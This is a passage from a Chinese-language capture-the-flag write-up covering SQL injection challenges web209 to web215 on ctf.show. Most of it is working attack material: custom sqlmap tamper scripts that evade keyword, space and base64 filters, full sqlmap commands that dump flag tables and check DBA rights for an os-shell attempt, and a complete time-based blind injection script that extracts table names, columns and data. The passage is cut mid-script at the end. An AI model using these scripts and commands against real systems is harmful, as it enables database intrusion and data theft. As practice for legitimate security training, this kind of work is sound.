<p><code>$id = str_replace('select', '', $id);</code><br><code>preg_match('/ /', $str)</code></p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//对传入的参数进行了过滤</span>
<span class="token comment">// $id = str_replace('select', '', $id);</span>
  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/ /'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>继续加载荷，过滤了<code>select</code>和空格<br>因为校园网+代理问题，一直302，故sqlmap暂时搁置，以后有机会再写，可以先看<a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/article/details/110144623">Y4大佬的博客</a><br>[11.29补]: 怎么说呢，出题人失误，select未匹配大小写，所以和上一题一样。。。因为sqlmap跑的关键字全是大写的根本匹配不到哈哈哈</p>
<h2 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h2><p>sql：<code>$sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 0,1;";</code><br>waf: <code>preg_match('/ |\*|\=/', $str);</code><br>like代替=，自己写tamper，基础教程<a target="_blank" rel="noopener" href="https://y4er.com/post/sqlmap-tamper/">点此</a>，一开始照着sqlmap自带的tamper魔改了一下发现，database和tables、columns都可以跑出来，但是flag不能出，又去参考Y4大佬的博客，okk更改过程写在代码里了<br>最终payload：<code> py2 .\sqlmap.py -u "http://aad8992e-a4a8-4c56-9921-fa1277ac5427.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://aad8992e-a4a8-4c56-9921-fa1277ac5427.chall.ctf.show/api/getToken.php --safe-freq=1 --tamper="ctfshow_web209" --prefix="'" --dbms=mysql -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx --dump --batch</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding:     utf-8</span>
<span class="token comment"># @Author:      yq1ng</span>
<span class="token comment"># @Date:        2020-11-29 15:10</span>
<span class="token comment"># @challenges： web209</span>

<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY
__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>NORMAL <span class="token comment"># 当前脚本调用优先等级</span>

<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 声明当前脚本适用/不适用的范围，可以为空。</span>
	<span class="token keyword">pass</span>

<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 用于篡改Payload、以及请求头的主要函数</span>
    payload <span class="token operator">=</span> web209<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    <span class="token keyword">return</span> payload

<span class="token keyword">def</span> <span class="token function">web209</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    retVal <span class="token operator">=</span> payload

    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> <span class="token string">""</span>
        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>

        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>
                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>
                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                    <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>
                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>
                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"like"</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span>
                <span class="token comment">#retVal += chr(0x79)//跑flag发现不能用字母，GG</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>

    <span class="token keyword">return</span> retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h2><p>sql：<code>$sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 0,1;";</code><br>return: <code>return strrev(base64_decode(strrev(base64_decode($id))));</code> –&gt; 先解码再字符反转再解码再字符反转<br>编写tamper思路：反转-&gt;编码-&gt;反转-&gt;编码。参照自带脚本<code>base64encode.py</code><br>最终payload：<code>py2 .\sqlmap.py -u "http://f0d17799-5320-4b1f-9e76-42fc7fc5bf3d.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://f0d17799-5320-4b1f-9e76-42fc7fc5bf3d.chall.ctf.show/api/getToken.php --safe-freq=1 --tamper="ctfshow_web210" --dbms=mysql -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump --batch</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding:     utf-8</span>
<span class="token comment"># @Author:      yq1ng</span>
<span class="token comment"># @Date:        2020-11-29 16:20</span>
<span class="token comment"># @challenges： web210</span>

<span class="token keyword">import</span> base64

<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY
__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>NORMAL <span class="token comment"># 当前脚本调用优先等级</span>

<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 声明当前脚本适用/不适用的范围，可以为空。</span>
	<span class="token keyword">pass</span>

<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 用于篡改Payload、以及请求头的主要函数</span>
    payload <span class="token operator">=</span> web210<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    <span class="token keyword">return</span> payload

<span class="token keyword">def</span> <span class="token function">web210</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    retVal <span class="token operator">=</span> payload

    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h2><p>在上一题基础上过滤了空格，好说，加上一行替换<br>最终payload：<code>py2 .\sqlmap.py -u "http://5773f437-30b9-4c52-a029-ebbffa67f89a.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://5773f437-30b9-4c52-a029-ebbffa67f89a.chall.ctf.show/api/getToken.php --safe-freq=1 --tamper="ctfshow_web211" --dbms=mysql -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa --dump --batch</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding:     utf-8</span>
<span class="token comment"># @Author:      yq1ng</span>
<span class="token comment"># @Date:        2020-11-29 16:20</span>
<span class="token comment"># @challenges： web211</span>

<span class="token keyword">import</span> base64

<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY
__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>NORMAL <span class="token comment"># 当前脚本调用优先等级</span>

<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 声明当前脚本适用/不适用的范围，可以为空。</span>
	<span class="token keyword">pass</span>

<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 用于篡改Payload、以及请求头的主要函数</span>
    payload <span class="token operator">=</span> web211<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    <span class="token keyword">return</span> payload

<span class="token keyword">def</span> <span class="token function">web211</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    retVal <span class="token operator">=</span> payload

    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"/**/"</span><span class="token punctuation">)</span>
        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h2><p>211基础过滤*，似曾相识？对！209的tamper加上！<br>最终payload：<code>py2 .\sqlmap.py -u "http://fe5aacfa-02d5-4596-a385-7bf1a7a3bca1.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://fe5aacfa-02d5-4596-a385-7bf1a7a3bca1.chall.ctf.show/api/getToken.php --safe-freq=1 --tamper="ctfshow_web212" --dbms=mysql -D ctfshow_web -T ctfshow_flavis -C ctfshow_flagxsa --dump --batch</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding:     utf-8</span>
<span class="token comment"># @Author:      yq1ng</span>
<span class="token comment"># @Date:        2020-11-29 17:00</span>
<span class="token comment"># @challenges： web212</span>

<span class="token keyword">import</span> base64

<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY
__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>NORMAL <span class="token comment"># 当前脚本调用优先等级</span>

<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 声明当前脚本适用/不适用的范围，可以为空。</span>
	<span class="token keyword">pass</span>

<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 用于篡改Payload、以及请求头的主要函数</span>
    payload <span class="token operator">=</span> web209<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    payload <span class="token operator">=</span> web212<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    <span class="token keyword">return</span> payload

<span class="token keyword">def</span> <span class="token function">web212</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    retVal <span class="token operator">=</span> payload

    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> retVal

<span class="token keyword">def</span> <span class="token function">web209</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    retVal <span class="token operator">=</span> payload

    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> <span class="token string">""</span>
        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>

        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>
                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>
                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                    <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>
                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>
                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"like"</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>

    <span class="token keyword">return</span> retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h2><p>任务：<code>练习使用--os-shell 一键getshell</code><br>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/58007573">https://zhuanlan.zhihu.com/p/58007573</a></p>
<ol>
<li>查看当前注入点数据库权限是否为dba<br><code>py2 .\sqlmap.py -u "http://f35926e1-d8ff-419a-991b-12df1eb20362.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://f35926e1-d8ff-419a-991b-12df1eb20362.chall.ctf.show/api/getToken.php --safe-freq=1 --tamper="ctfshow_web212" --dbms=mysql --is-dba --batch</code>\ <pre class="line-numbers language-none"><code class="language-none">[17:23:47] [INFO] retrieved: root@localhost
current user is DBA: True<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li>寻找绝对路径<br><code>py2 .\sqlmap.py -u "http://f35926e1-d8ff-419a-991b-12df1eb20362.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://f35926e1-d8ff-419a-991b-12df1eb20362.chall.ctf.show/api/getToken.php --safe-freq=1 --tamper="ctfshow_web212" --dbms=mysql --sql-shell --batch</code><br><code>select @@datadir;</code> –&gt; 数据库绝对路径 –&gt; <code>/var/lib/mysql/</code><br><code>select @@basedir;</code> –&gt; MySql安装路径 –&gt; <code>/usr</code></li>
<li>getshell<br>失败了，等着填坑，提示根目录不对。。</li>
</ol>
<h2 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h2><p>[11.29补]: 忘了214是时间盲注了，我以为是sqlmap，215脚本拿来用，不过是数字型注入，payload：<code>-1 or(if(left((select %s from %s),%d)='%s',sleep(3),1))</code>，还是要多跑两边，强烈建议<code>left()</code>截取函数，懒得改下面的了，参考表名：<code>ctfshow_flagx</code>，参考列名：<code>flaga</code></p>
<h2 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h2><p>提示查询给了单引号，其他全没有，真就闭着眼睛注呗，由于是先做的233，结果直接拿来用了，一个字：慢！！！太慢了！<del>有时flag不准</del>，跑了228S。。。学着写线程了，估计明天才能出了，这两天课多呜呜呜。我回来了，太菜了写不出来，进程锁加上又太慢，师傅们写了请务必让本菜鸡参考一下，在此非常感谢师傅</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding:     utf-8</span>
<span class="token comment"># @Author:      yq1ng</span>
<span class="token comment"># @Date:        2020-11-25 21:00</span>
<span class="token comment"># @challenges： web215</span>

<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://31bee14e-12a1-4dff-89f1-60ba46a1baaa.chall.ctf.show/api/index.php"</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"debug"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"ip"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">}</span>
tb_name <span class="token operator">=</span> <span class="token string">''</span>
column_name <span class="token operator">=</span> <span class="token string">''</span>
flag <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token string">r'ctfshow_abdegijklmnopqruvxyz-,1234567890!'</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"-1'or(if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%c',sleep(3),1))and'1'='1"</span><span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        data<span class="token punctuation">[</span><span class="token string">"ip"</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload
        <span class="token comment">#print(data)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        time <span class="token operator">=</span> r<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment">#print(time)#获取响应时间</span>
        <span class="token keyword">if</span> time <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
            tb_name <span class="token operator">+=</span> j
            <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[+]table name is %s"</span><span class="token operator">%</span> tb_name<span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">"!"</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>

guess_tbName <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\nPlease enter the name of the table you want to guess: "</span><span class="token punctuation">)</span>
<span class="token comment">#column_name</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token string">r'abcdefghijklmnopqrstuvwxyz_,1234567890!'</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"-1'or(if(substr((select group_concat(column_name) from information_schema.columns where table_name='%s'),%d,1)='%c',sleep(3),1))and'1'='1"</span><span class="token operator">%</span> <span class="token punctuation">(</span>guess_tbName<span class="token punctuation">,</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        data<span class="token punctuation">[</span><span class="token string">"ip"</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload
        <span class="token comment">#print(data)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        time <span class="token operator">=</span> r<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment">#print(time)#获取响应时间</span>
        <span class="token keyword">if</span> time <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
            column_name <span class="token operator">+=</span> j
            <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[+]The column name in the %s table is %s"</span><span class="token operator">%</span><span class="token punctuation">(</span>guess_tbName<span class="token punctuation">,</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">"!"</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>

guess_flag <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n\nOkay, we're getting a flag. Tell me the list:"</span><span class="token punctuation">)</span>
<span class="token comment">#flag</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nGetting the flag......"</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token string">r'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"-1'or(if(substr((select %s from %s),%d,1)='%c',sleep(3),1))and'1'='1"</span><span class="token operator">%</span> <span class="token punctuation">(</span>guess_flag<span class="token punctuation">,</span>guess_tbName<span class="token punctuation">,</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        data<span class="token punctuation">[</span><span class="token string">"ip"</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload
        <span class="token comment">#print(data)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        time <span class="token operator">=</span> r<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment">#print(time)#获取响应时间</span>
        <span class="token keyword">if</span> time <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> j
            <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[+]The flag is %s"</span><span class="token operator">%</span> flag<span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">"}"</span><span class="token punctuation">:</span>
